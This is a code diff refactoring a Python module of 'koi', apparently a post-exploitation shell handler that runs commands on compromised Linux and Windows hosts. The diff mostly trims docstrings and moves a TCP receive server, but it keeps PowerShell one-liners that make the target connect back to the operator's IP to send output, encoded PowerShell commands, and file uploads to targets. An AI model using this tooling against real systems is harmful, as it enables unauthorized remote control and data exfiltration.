@@ -6,7 +6,6 @@ import inspect
 import re
 import select
 import shlex
-import threading
 import time
 import uuid
 from abc import ABC, abstractmethod
@@ -16,23 +15,20 @@ if TYPE_CHECKING:
     from koi.session import Session
 
 from koi.utils.config import TIMEOUTS
+from koi.utils.constants import ANSI_RE, SOCKET_BUFFER_SIZE
 from koi.utils.models import CommandResult, StreamLine
 from koi.utils import ui
 from koi.utils.tcp import (
-    bind_side_channel_port,
+    TCPReceiveServer,
     get_local_ip,
-    spawn_recv_server,
     spawn_send_server,
 )
 
 import argparse
 
 _PS_PROMPT = re.compile(r'^PS\s+\S+>\s*')
-_ANSI_RE   = re.compile(r'\x1b\[[0-9;?]*[a-zA-Z]|\r')
 
-# Opening lines exec_stream holds while learning whether the shell echoes.
-# Covers a multi-line prompt; past it they are released, so a non-echoing shell
-# loses nothing but a brief delay.
+# Lines exec_stream holds while learning whether the shell echoes.
 _ECHO_PREAMBLE_LINES = 8
 _SELECT_TIMEOUT = 0.1
 
@@ -40,10 +36,9 @@ _SELECT_TIMEOUT = 0.1
 def _owns_io(fn):
     """Hold the session's I/O lock for the whole call.
 
-    Every method that talks to ``self.session.conn`` needs this: without it a
-    concurrent reader elsewhere in the process consumes bytes this method is
-    waiting for, and the command sentinel never arrives. The lock is reentrant,
-    so nesting (``_upload_bytes_lin`` -> ``_try_exec`` -> ``exec``) is free.
+    Every method touching ``self.session.conn`` needs this, or a concurrent
+    reader eats the bytes it waits for and the sentinel never arrives.
+    Reentrant, so nesting is free.
     """
     if inspect.isgeneratorfunction(fn):
         @functools.wraps(fn)
@@ -62,68 +57,6 @@ PlatformSpec = Union[
     List[Literal["linux", "windows_cmd", "windows_ps"]],
 ]
 
-class TCPReceiveServer:
-    """One-shot TCP server that collects bytes from the first incoming connection."""
-
-    def __init__(self, timeout: float = TIMEOUTS["download"], on_progress=None):
-        self._timeout     = timeout
-        self._on_progress = on_progress
-        self._sock        = None
-        self._done        = threading.Event()
-        self._data        = b""
-        self._error       = None
-        self.port: int    = 0
-
-    def start(self) -> "TCPReceiveServer":
-        self._sock, self.port = bind_side_channel_port()
-        self._sock.listen(1)
-        self._sock.settimeout(self._timeout)
-        threading.Thread(target=self._run, daemon=True).start()
-        return self
-
-    def _run(self) -> None:
-        try:
-            conn, _ = self._sock.accept()
-            buf = b""
-            while chunk := conn.recv(65536):
-                buf += chunk
-                if self._on_progress:
-                    self._on_progress(len(buf))
-            conn.close()
-            self._data = buf
-        except Exception as exc:
-            self._error = str(exc)
-        finally:
-            self._close()
-            self._done.set()
-
-    def collect(self) -> bytes:
-        """Block until all data is received. Raises RuntimeError or TimeoutError."""
-        self._done.wait(timeout=self._timeout + 2)
-        if self._error:
-            raise RuntimeError(self._error)
-        if not self._done.is_set():
-            raise TimeoutError("TCP receive server timed out")
-        return self._data
-
-    def stop(self) -> None:
-        self._close()
-
-    def _close(self) -> None:
-        if self._sock:
-            try:
-                self._sock.close()
-            except OSError:
-                pass
-            self._sock = None
-
-    def __enter__(self) -> "TCPReceiveServer":
-        return self.start()
-
-    def __exit__(self, *_) -> None:
-        self.stop()
-
-
 class CommandTimeout(Exception):
     def __init__(self, command: str, timeout: float):
         self.command = command
@@ -136,12 +69,7 @@ class ModuleArgumentError(ValueError):
 
 
 class _ModuleParser(argparse.ArgumentParser):
-    """argparse that reports failures instead of printing usage and exiting.
-
-    The default writes to stderr then raises SystemExit, which is useless to a
-    caller that has to explain the failure: the REPL used to swallow it into an
-    empty Namespace and let the module die on a missing attribute instead.
-    """
+    """argparse that raises instead of printing usage and calling sys.exit."""
 
     def error(self, message):
         usage = self.format_usage().strip().removeprefix("usage: ")
@@ -192,19 +120,16 @@ class KoiModule(ABC):
     #: External resources (URLs) needed by this module, used by --local-prepare
     external_resources: list[dict] = []
 
-    #: Delimiters used to reconstruct structured data from the flat text a
-    #: remote shell returns. Both the command that joins values and the parser
-    #: that splits them must reference these constants so they never desync.
-    #: They MUST stay ASCII: a non-ASCII token does not survive the
-    #: cp1252 -> UTF-8 console round-trip of an upgraded ConPtyShell, which
-    #: would collapse the joined output into a single record.
+    #: Delimiters for rebuilding structured data from a shell's flat text.
+    #: MUST stay ASCII: a non-ASCII token does not survive the cp1252 -> UTF-8
+    #: round-trip of an upgraded ConPtyShell and collapses every record into one.
     REC_SEP: str = "KOISEP"    # between records of a joined list
     SEC_SEP: str = "KOISEC"    # between top-level sections
     FIELD_SEP: str = "|||"     # between fields of a single record
 
     @staticmethod
     def _clean(text: str) -> str:
-        return _ANSI_RE.sub("", text).strip()
+        return ANSI_RE.sub("", text).replace("\r", "").strip()
 
     @staticmethod
     def _shell_quote(path: str) -> str:
@@ -231,12 +156,9 @@ class KoiModule(ABC):
     def resolve_external_resources(cls) -> list[dict]:
         """Return the resources ``--local-prepare`` should cache for this module.
 
-        Defaults to the static :attr:`external_resources` list. Override it when
-        the set is only known at prep time, e.g. a module that always fetches the
-        latest upstream release: the override resolves the version now and lists
-        every asset variant, each under the exact ``cache_key`` the module will
-        look up at run time so the offline path actually hits the cache. Called
-        only by ``--local-prepare`` (online), so a network call here is fine.
+        Override when the set is only known at prep time (e.g. always-latest
+        releases), keying each entry under the ``cache_key`` run time will look
+        up. Only called online, so a network call here is fine.
         """
         return list(cls.external_resources or [])
 
@@ -292,14 +214,10 @@ class KoiModule(ABC):
 
     @_owns_io
     def _win_query(self, ps_expr: str, timeout: float = TIMEOUTS["exec_query"]) -> str:
-        """
-        Evaluate a PowerShell expression on the remote Windows target and return
-        its string output.
+        """Evaluate a PowerShell expression on the target, returning its output.
 
-        For plain (non-upgraded) sessions the result is read back inline via a
-        sentinel marker.  For upgraded ConPtyShell sessions the output is a raw
-        VT100 stream, so we redirect the result over a fresh side-channel TCP
-        socket instead (same technique as _exec_clean for Linux).
+        Plain sessions read the result back inline via a sentinel marker; an
+        upgraded ConPtyShell emits raw VT100, so that path uses a side channel.
         """
         if self.session.upgraded:
             return self._win_query_sidechannel(ps_expr, timeout)
@@ -308,15 +226,11 @@ class KoiModule(ABC):
         marker = f"__KOI_{sentinel}__"
 
         if self.session.os_type == "windows_ps":
-            # No outer () wrapping: (try{...}catch{...}) is invalid PS syntax,
-            # and all existing expressions (if/else, property access, try/catch)
-            # produce pipeline output correctly without it.
+            # No outer (): (try{...}catch{...}) is invalid PS syntax.
             cmd = f"{ps_expr}; '{marker}'"
         else:
-            # windows_cmd: launch PowerShell from cmd.exe. ps_expr routinely
-            # contains double quotes, which would collide with -c "..." and
-            # truncate the command. Encode it (base64 of UTF-16LE) so no quoting
-            # can break it, the same technique the ConPtyShell upgrade uses.
+            # Base64 (UTF-16LE) so the double quotes ps_expr routinely carries
+            # cannot collide with cmd.exe's -c "..." and truncate the command.
             inner = f"{ps_expr}; '{marker}'"
             encoded = base64.b64encode(inner.encode("utf-16-le")).decode("ascii")
             cmd = f"powershell -NoProfile -NonInteractive -EncodedCommand {encoded}"
@@ -336,7 +250,7 @@ class KoiModule(ABC):
             r, _, _ = select.select([self.session.conn], [], [], min(remaining, _SELECT_TIMEOUT))
             if not r:
                 continue
-            chunk = self.session.conn.recv(65536)
+            chunk = self.session.conn.recv(SOCKET_BUFFER_SIZE)
             if not chunk:
                 break
             buf += chunk
@@ -363,24 +277,24 @@ class KoiModule(ABC):
 
     @_owns_io
     def _win_query_sidechannel(self, ps_expr: str, timeout: float = TIMEOUTS["exec_query"]) -> str:
-        """
-        Variant of _win_query for upgraded (ConPtyShell) sessions.
-        Opens a local TCP socket and asks PowerShell to push its result there,
-        bypassing the VT100 stream entirely.
-        """
+        """_win_query for upgraded sessions: PowerShell pushes the result to a
+        local socket, bypassing the VT100 stream."""
         local_ip = self._get_local_ip()
-        port, collect = spawn_recv_server(timeout=timeout)
-
-        ps_cmd = (
-            f"$_r=({ps_expr})|Out-String;"
-            f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
-            f"$_s=$_c.GetStream();"
-            f"$_b=[Text.Encoding]::UTF8.GetBytes($_r.Trim());"
-            f"$_s.Write($_b,0,$_b.Length);"
-            f"$_s.Flush();$_c.Close()"
-        )
-        self.session.conn.sendall((ps_cmd + "\r\n").encode(self.session.encoding))
-        result = collect().decode("utf-8", errors="replace").strip()
+        with TCPReceiveServer(timeout=timeout) as srv:
+            ps_cmd = (
+                f"$_r=({ps_expr})|Out-String;"
+                f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{srv.port});"
+                f"$_s=$_c.GetStream();"
+                f"$_b=[Text.Encoding]::UTF8.GetBytes($_r.Trim());"
+                f"$_s.Write($_b,0,$_b.Length);"
+                f"$_s.Flush();$_c.Close()"
+            )
+            self.session.conn.sendall((ps_cmd + "\r\n").encode(self.session.encoding))
+            try:
+                raw = srv.collect()
+            except (RuntimeError, TimeoutError):
+                raw = b""  # a query that never came back is an empty answer
+        result = raw.decode("utf-8", errors="replace").strip()
         if self._logger and result:
             self._logger.log_event(f"exec  {ps_expr}")
             self._logger.log_output(result.encode("utf-8", errors="replace"))
@@ -423,7 +337,7 @@ class KoiModule(ABC):
             time.sleep(0.3)
             r, _, _ = select.select([self.session.conn], [], [], 1.0)
             if r:
-                self.session.conn.recv(65536)
+                self.session.conn.recv(SOCKET_BUFFER_SIZE)
         elif self.session.os_type == "windows_ps":
             self.sendline(ps_cmd)
         else:
@@ -464,10 +378,8 @@ class KoiModule(ABC):
     ) -> bool:
         """Transfer *raw* bytes to *dest* on a Windows target via a PS TCP client.
 
-        The transfer is verified by comparing the on-target file size to the
-        number of bytes sent (same approach as the Linux path), so a silent
-        write failure (access denied, AV removal, full disk) is reported as a
-        failure instead of a false success.
+        Verified against the on-target file size, so a silent write failure
+        (access denied, AV removal, full disk) is not reported as success.
         """
         local_ip = self._get_local_ip()
         ps_dest = self._ps_quote(dest)
@@ -512,12 +424,10 @@ class KoiModule(ABC):
         return self._upload_bytes_win(raw, dest, timeout, on_progress)
 
     def run_module(self, io_timeout: Optional[float] = None) -> None:
-        """Run the module while owning the session socket for its whole duration.
+        """Run the module while owning the session socket throughout.
 
-        A module is a sequence of commands whose intermediate state matters, so
-        the lock is held across the entire run rather than per ``exec()`` call.
-        ``io_timeout=None`` waits indefinitely (the REPL); an out-of-band caller
-        passes a timeout and handles :class:`~koi.session.SessionBusy`.
+        Held across the whole run, not per ``exec()``: a module's intermediate
+        state matters. ``io_timeout=None`` waits indefinitely.
         """
         with self.session.io(holder=f"module:{self.name}", timeout=io_timeout):
             if self._logger:
@@ -548,14 +458,9 @@ class KoiModule(ABC):
     def _read_lines(self, command: str, timeout: float) -> Iterator[str]:
         """Yield decoded lines from the session socket until the peer goes quiet.
 
-        The transport half of the sentinel protocol, shared by exec() and
-        exec_stream(): both send a wrapped command and read lines back until
-        their marker shows up. Keeping one reader is what stops the two from
-        drifting, which is how exec_stream ended up blind to the PTY echo that
-        exec already handled.
-
-        Raises :class:`CommandTimeout` if *timeout* elapses, and returns when
-        the socket closes. Callers hold the session I/O lock already.
+        The transport half of the sentinel protocol; keep exec() and
+        exec_stream() on this one reader so they cannot drift. Raises
+        :class:`CommandTimeout`, returns when the socket closes.
         """
         buf = b""
         deadline = time.monotonic() + timeout
@@ -569,7 +474,7 @@ class KoiModule(ABC):
             if not ready:
                 continue
 
-            chunk = self.session.conn.recv(65536)
+            chunk = self.session.conn.recv(SOCKET_BUFFER_SIZE)
             if not chunk:
                 return
 
@@ -582,8 +487,7 @@ class KoiModule(ABC):
     def exec(self, command: str, timeout: float = TIMEOUTS["exec_command"], _silent: bool = False):
         marker = f"__KOI_DONE_{uuid.uuid4().hex}__"
         # A PTY echoes the wrapper back, so a line merely *containing* the marker
-        # is that echo, not the terminator. Anchoring on the numeric exit code
-        # tells them apart, and keeps int() below off a literal `$_rc`.
+        # is that echo. Anchor on the numeric exit code to tell them apart.
         done_re = re.compile(rf"^{re.escape(marker)}:(-?\d+)$")
         wrapped = f'( {command} ); _rc=$?; printf "\\n{marker}:$_rc\\n"\n'
         self.session.conn.sendall(wrapped.encode("utf-8"))
@@ -616,11 +520,7 @@ class KoiModule(ABC):
 
     @_owns_io
     def exec_stream(self, command: str, timeout: float = TIMEOUTS["exec_command"]):
-        """
-        Stream output of *command* line-by-line from the remote session as
-        :class:`~koi.shell_handler.result.StreamLine` objects.
-
-        Example::
+        """Stream *command* output line by line as :class:`StreamLine` objects::
 
             for line in self.exec_stream("find / -name '*.conf' 2>/dev/null"):
                 self.notify('info', line.text)
@@ -629,9 +529,9 @@ class KoiModule(ABC):
         wrapped = f'( {command} ); printf "\\n{marker}\\n"\n'
         self.session.conn.sendall(wrapped.encode("utf-8"))
 
-        # Unlike exec(), this cannot drop the prompt-and-echo preamble after the
-        # fact, so opening lines are held until the echo identifies them as
-        # noise. A shell that does not echo never sends one, hence the cap.
+        # Unlike exec(), this cannot drop the preamble after the fact, so
+        # opening lines are held until the echo marks them as noise. A
+        # non-echoing shell never sends one, hence the cap.
         pending: List[str] = []
         holding = True
 
@@ -653,18 +553,12 @@ class KoiModule(ABC):
                 yield StreamLine(text=held)
             pending.clear()
 
-        # Whatever is still held when the command ends was never identified as
-        # noise, so it is output: the terminator arrived before the cap.
+        # Still held at the end means never identified as noise, so it is output.
         for held in pending:
             yield StreamLine(text=held)
 
     def send(self, data: bytes) -> bool:
-        """
-        Write raw *bytes* directly to the session socket.
-        Returns ``False`` if the session is no longer alive.
-
-        Useful for sending keystrokes or raw payloads.
-        """
+        """Write raw bytes to the socket; False if the session is dead."""
         return self.session.send(data)
 
     def sendline(self, line: str, encoding: str = "utf-8") -> bool:
